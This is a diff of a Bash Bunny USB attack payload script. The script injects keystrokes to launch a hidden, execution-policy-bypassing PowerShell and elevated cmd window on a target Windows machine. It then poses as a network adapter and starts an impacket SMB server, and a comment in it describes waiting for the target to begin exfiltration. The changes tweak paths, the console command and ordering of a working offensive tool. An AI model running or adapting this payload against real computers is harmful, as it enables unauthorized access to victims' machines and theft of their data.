@@ -35,13 +35,14 @@ LED R G 100
 
 
 # Check for impacket. If not found, blink fast red.
-if [ ! -d /pentest/impacket/ ]; then
+if [ ! -f pentest/impacket/examples/smbserver.py ]; then
   LED R 100
   exit 1
 fi
 
 # remove old Handshake Files
 rm -f $SWITCHDIR/CON_*
+
 
 # HID STAGE
 # Runs minimized powershell waiting for Bash Bunny to appear as 172.16.64.1.
@@ -57,7 +58,8 @@ LED R G 100
 # Launch powershell as admin and deletes Run history
 Q GUI r
 Q DELAY 1000
-Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=80' -Verb runAs"
+#Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=180' -Verb runAs"
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/k mode con lines=1 cols=180' -Verb runAs"
 Q DELAY 500
 Q ENTER
 
@@ -79,18 +81,19 @@ Q ENTER
 # Ethernet Tage
 LED R B 1
 ATTACKMODE RNDIS_ETHERNET
+# Source bunny_helpers.sh to get environment variables
+source bunny_helpers.sh
 
 
 # Start SMB Server
 /pentest/impacket/examples/smbserver.py e $SWITCHDIR &
 
-
-# Source bunny_helpers.sh to get environment variables
-source bunny_helpers.sh
-
-
 # Give target a chance to start exfiltration
 sleep 2
+
+# Here you can do anything else except but do not change the ATTACKMODE or umount /root/udisk
+
+
 
 # Check target IP address. If unset, blink slow red.
 if [ -z "${TARGET_IP}" ]; then
